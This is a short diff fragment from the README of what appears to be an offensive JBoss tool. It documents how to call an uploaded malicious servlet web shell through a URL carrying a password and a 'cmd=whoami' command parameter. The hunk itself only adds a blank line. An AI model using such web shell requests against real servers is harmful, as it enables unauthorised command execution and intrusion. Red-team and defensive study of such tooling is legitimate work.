@@ -38,4 +38,5 @@ Once uploaded the servlet should be accessible via a URL simmilar to:
 http(s)://<<TARGET>>/<<DEPLOY_PATH>>/mal_javax?pass=<<PASSWORD>>&cmd=whoami
 ```
 **Note 1**: Usually the "\<\<DEPLOY_PATH\>\>" is "mal_jboss".
+
 **Note 2**: Replace "\<\<PASSWORD\>\>" in the request with the the password you have set up during the compilation step. 
